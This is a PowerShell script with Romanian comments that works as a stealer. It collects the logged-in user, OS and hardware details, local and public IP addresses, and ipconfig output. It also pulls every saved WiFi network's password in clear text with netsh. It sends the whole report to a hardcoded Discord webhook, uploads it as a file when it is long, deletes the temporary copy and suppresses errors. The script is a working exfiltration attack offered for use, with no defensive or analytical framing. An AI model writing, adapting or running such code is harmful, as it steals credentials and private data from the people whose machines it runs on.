# ==========================================
# 1. CONFIGURARE WEBHOOK
# ==========================================
$WebhookUrl = "https://discord.com/api/webhooks/1568344051365711922/8wsoRQRVOcxd4OnQXL-YovC3dUgq-iwZm4HprnKK_Hwid9rKvjDc2UnsfYWI0oTudEbQ"
$output = ""

# --- Funcție Ajutătoare pentru Rularea în Siguranță ---
function Get-SafeCommand {
    param([scriptblock]$ScriptBlock)
    try { return &$ScriptBlock } catch { return $null }
}

# ==========================================
# 2. COLECTARE DATE SISTEM
# ==========================================

# User Info
$output += "=== User Info ===`n"
$username = [System.Environment]::UserName
$osCaption = Get-SafeCommand { (Get-CimInstance Win32_OperatingSystem).Caption }
$output += "Logged-in User: $username`n"
$output += "OS Edition: $osCaption`n`n"

# System Info
$output += "=== System Info ===`n"
$hostname = [System.Net.Dns]::GetHostName()
$osVersion = [System.Environment]::OSVersion.Version
$output += "PC Name: $hostname`n"
$output += "OS Build: Windows $osVersion`n`n"

# Hardware Info
$output += "=== Hardware Info ===`n"
try {
    $cpu = (Get-CimInstance Win32_Processor).Name
    $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
    $gpu = (Get-CimInstance Win32_VideoController).Name

    $output += "CPU: $(if ($cpu) { $cpu } else { 'Not available' })`n"

    if ($ram) {
        $ramGb = [math]::Round([int64]$ram / 1GB, 2)
        $output += "RAM: $ramGb GB`n"
    } else {
        $output += "RAM: Not available`n"
    }

    $output += "GPU:`n$(if ($gpu) { $gpu -join "`n" } else { 'Not available' })`n`n"
} catch {
    $output += "Hardware Error`n`n"
}

# IP Info (FIXED CU CLASĂ .NET)
$output += "=== IP Info ===`n"
try {
    $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
        $_.IPAddress -notlike "127.*" -and 
        $_.IPAddress -notlike "169.254.*" -and
        $_.InterfaceAlias -notlike "*Loopback*" 
    } | Select-Object -First 1).IPAddress
    $output += "Local IP: $localIp`n"
} catch {
    $localIp = "Not available"
}

try {
    # Metodă curată .NET: Forțăm descărcarea ca string brut ignorând regulile de browser ale serverului
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $publicIp = ($webClient.DownloadString("https://api.ipify.org")).Trim()
    $output += "Public IP: $publicIp`n`n"
} catch {
    $output += "Public IP: Not available`n`n"
}

# WiFi Info
$output += "=== WiFi Info ===`n"
$wifiInfo = Get-SafeCommand { netsh wlan show interfaces }
if ($wifiInfo -and ($wifiInfo -notmatch "There is no wireless interface")) {
    $output += ($wifiInfo -join "`n") + "`n`n"
} else { 
    $output += "Not available (Ethernet / disabled / no permission)`n`n" 
}

# Saved WiFi Profiles
$output += "=== Saved WiFi Networks ===`n"
$profiles = Get-SafeCommand { 
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":").Trim() } 
}

if ($profiles) {
    foreach ($p in $profiles) {
        $passLine = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
        if ($passLine) {
            $password = ($passLine -split ":").Trim()
            $output += "$p : $password`n"
        } else {
            $output += "$p : (No access)`n"
        }
    }
} else {
    $output += "No saved networks found`n"
}
$output += "`n"

# Network Details
$output += "=== Network Details ===`n"
$net = Get-SafeCommand { ipconfig }
if ($net) { 
    $output += ($net -join "`n") + "`n`n" 
} else {
    $output += "Could not retrieve network details`n`n"
}

# ==========================================
# 3. TRIMITERE COMPATIBILĂ PE DISCORD
# ==========================================
if ($output.Length -le 2000) {
    try {
        $Body = @{ content = $output } | ConvertTo-Json
        $null = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
    } catch {}
} else {
    try {
        $TempPath = "$env:TEMP\SystemReport.txt"
        $output | Out-File -FilePath $TempPath -Encoding utf8
        
        $Boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $FileBytes = [System.IO.File]::ReadAllBytes($TempPath)
        $FileHeader = "--$Boundary$LF" +
                      "Content-Disposition: form-data; name=`"file`"; filename=`"SystemReport.txt`"$LF" +
                      "Content-Type: text/plain$LF$LF"
        $FileFooter = "$LF--$Boundary--$LF"
        
        $HeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($FileHeader)
        $FooterBytes = [System.Text.Encoding]::UTF8.GetBytes($FileFooter)
        
        $TotalBytes = New-Object Byte[] ($HeaderBytes.Length + $FileBytes.Length + $FooterBytes.Length)
        [System.Buffer]::BlockCopy($HeaderBytes, 0, $TotalBytes, 0, $HeaderBytes.Length)
        [System.Buffer]::BlockCopy($FileBytes, 0, $TotalBytes, $HeaderBytes.Length, $FileBytes.Length)
        [System.Buffer]::BlockCopy($FooterBytes, 0, $TotalBytes, ($HeaderBytes.Length + $FileBytes.Length), $FooterBytes.Length)
        
        $ContentType = "multipart/form-data; boundary=$Boundary"
        $null = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $TotalBytes -ContentType $ContentType
        
        Remove-Item -Path $TempPath -Force
    } catch {}
}
